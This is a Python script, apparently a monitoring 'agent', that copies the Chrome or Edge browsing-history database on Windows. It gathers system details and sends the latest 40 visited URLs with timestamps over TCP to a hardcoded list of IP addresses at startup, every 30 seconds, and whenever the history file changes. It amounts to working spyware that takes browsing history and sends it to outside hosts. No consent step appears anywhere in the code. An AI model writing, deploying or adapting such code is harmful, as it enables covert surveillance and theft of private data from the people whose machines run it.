import socket
import json
import platform
import psutil
import os
import sqlite3
import shutil
import time
import threading  
from datetime import datetime, timedelta, timezone  # <--- Added timezone import here
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

# LIST ALL RUNNING DASHBOARD IPs HERE
DASHBOARD_IPS = ["192.168.1.4","172.65.21.7", "172.65.21.90", "172.65.21.1"] 
PORT = 5005
HEARTBEAT_INTERVAL = 30  

def get_real_browser_history(limit=40):
    """ Extracts latest browsing history safely and adjusts UTC to Local Time """
    history_items = []
    if platform.system() != "Windows":
        return [{"site": "History extraction only supported on Windows", "ip": "-"}]
        
    app_data = os.getenv("LOCALAPPDATA")
    if not app_data:
        return [{"site": "Could not locate LocalAppData path", "ip": "-"}]

    browser_paths = {
        "Chrome": os.path.join(app_data, r"Google\Chrome\User Data\Default\History"),
        "Edge": os.path.join(app_data, r"Microsoft\Edge\User Data\Default\History")
    }
    
    history_db_path = None
    for browser, path in browser_paths.items():
        if os.path.exists(path):
            history_db_path = path
            break
            
    if not history_db_path:
        return [{"site": "No supported browser history file found.", "ip": "-"}]
        
    temp_db_path = "temp_history_db.sqlite"
    
    try:
        shutil.copyfile(history_db_path, temp_db_path)
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        
        query = f"SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT {limit}"
        cursor.execute(query)
        
        for url, webkit_timestamp in cursor.fetchall():
            try:
                # Interpret Webkit timestamp starting point as UTC
                epoch_start = datetime(1601, 1, 1, tzinfo=timezone.utc)
                delta = timedelta(microseconds=webkit_timestamp)
                utc_time = epoch_start + delta
                
                # Automatically shift the timestamp to this PC's local system time zone
                local_time = utc_time.astimezone()
                readable_time = local_time.strftime('%Y-%m-%d %H:%M:%S')
            except Exception:
                readable_time = "Unknown Time"
                
            history_items.append({
                "site": url[:200], 
                "ip": readable_time
            })
        conn.close()
    except Exception as e:
        history_items = [{"site": f"Reading database... ({str(e)})", "ip": "-"}]
    finally:
        if os.path.exists(temp_db_path):
            try:
                os.remove(temp_db_path)
            except OSError:
                pass
            
    return history_items if history_items else [{"site": "No history records found.", "ip": "-"}]

def broadcast_telemetry(reason="Event Triggered"):
    """ Gathers system metrics and broadcasts immediately to all active dashboards """
    print(f"[*] [{datetime.now().strftime('%H:%M:%S')}] [{reason}] Preparing telemetry payload...")
    
    real_specs = {
        "hostname": socket.gethostname().upper(),
        "os": f"{platform.system()} {platform.release()}",
        "cpu": platform.processor() or "Unknown CPU",
        "ram": f"{round(psutil.virtual_memory().total / (1024**3))} GB RAM",
        "history": get_real_browser_history(limit=40) 
    }

    payload = json.dumps(real_specs).encode('utf-8')

    for ip in DASHBOARD_IPS:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1.5)  
                s.connect((ip, PORT))
                s.sendall(payload)
            print(f"[==>] Telemetry sent to: {ip}")
        except Exception:
            pass

# ==========================================
# ASYNCHRONOUS AUTO-DISCOVERY THREAD
# ==========================================
def background_heartbeat_worker():
    """ Continuously checks in so dashboards started late pop up automatically """
    while True:
        time.sleep(HEARTBEAT_INTERVAL)
        broadcast_telemetry(reason="Periodic Heartbeat")

# ==========================================
# FILE SYSTEM MONITOR EVENT HANDLER
# ==========================================
class BrowserHistoryWatcher(FileSystemEventHandler):
    def __init__(self):
        self.last_triggered = time.time()

    def on_modified(self, event):
        if event.is_directory or not event.src_path.endswith("History"):
            return
            
        current_time = time.time()
        if current_time - self.last_triggered > 2.0:  
            self.last_triggered = current_time
            time.sleep(0.5)  
            broadcast_telemetry(reason="Instant Browser Event")

if __name__ == "__main__":
    app_data_dir = os.getenv("LOCALAPPDATA")
    
    chrome_dir = os.path.join(app_data_dir, r"Google\Chrome\User Data\Default")
    edge_dir = os.path.join(app_data_dir, r"Microsoft\Edge\User Data\Default")
    
    target_dir = None
    if os.path.exists(chrome_dir):
        target_dir = chrome_dir
    elif os.path.exists(edge_dir):
        target_dir = edge_dir

    if not target_dir:
        print("[-] Target browser path unavailable. Check installation.")
        exit(1)

    print(f"[*] AGENT ENGINE ONLINE: Watching folder {target_dir}")
    
    broadcast_telemetry(reason="Agent Initialization")

    heartbeat_thread = threading.Thread(target=background_heartbeat_worker, daemon=True)
    heartbeat_thread.start()

    event_handler = BrowserHistoryWatcher()
    observer = Observer()
    observer.schedule(event_handler, path=target_dir, recursive=False)
    observer.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()